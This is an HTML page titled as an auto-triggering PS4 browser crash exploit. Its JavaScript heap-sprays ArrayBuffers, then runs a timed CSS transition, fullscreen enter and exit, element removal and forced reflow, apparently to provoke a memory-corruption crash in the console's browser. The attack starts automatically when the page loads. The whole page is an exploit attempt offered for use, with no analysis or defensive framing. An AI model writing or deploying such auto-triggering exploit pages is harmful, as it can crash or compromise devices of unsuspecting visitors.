<!DOCTYPE html>
<html>
<head>
  <title>PS4 Full-Screen Crash (Auto-Trigger)</title>
  <style>
    #box { 
      width: 100px; height: 100px; 
      background: red; 
      transition: transform 0.5s linear; 
      position: absolute; 
      left: 0; top: 50%; 
    }
  </style>
</head>
<body style="background: #000; height: 200vh;">
  <div id="box"></div>
  <script>
    const box = document.getElementById('box');

    // Heap spray to control memory layout
    function heapSpray() {
      window.spray = [];
      for (let i = 0; i < 1000; i++) {
        window.spray.push(new ArrayBuffer(0x1000)); // Smaller chunks for finer control
      }
    }

    // Main exploit
    function triggerExploit() {
      heapSpray();
      
      // Start transition loop
      setInterval(() => {
        box.style.transform = 'translateX(0)';
        setTimeout(() => box.style.transform = 'translateX(300px)', 10);
      }, 1000);

      // Enter full-screen after a delay
      setTimeout(() => {
        document.documentElement.requestFullscreen()
          .then(() => {
            // Exit full-screen immediately (critical timing!)
            setTimeout(() => {
              document.exitFullscreen(); 
              // Trigger crash during transition
              setTimeout(() => {
                box.remove();
                document.body.offsetHeight; // Force reflow
              }, 50); // Adjust this delay for precision
            }, 100); // Exit full-screen delay
          })
          .catch(e => console.error("Fullscreen failed:", e));
      }, 2000); // Initial delay before full-screen
    }

    // Start automatically (if PS4 browser allows)
    setTimeout(triggerExploit, 1000);
  </script>
</body>
</html>
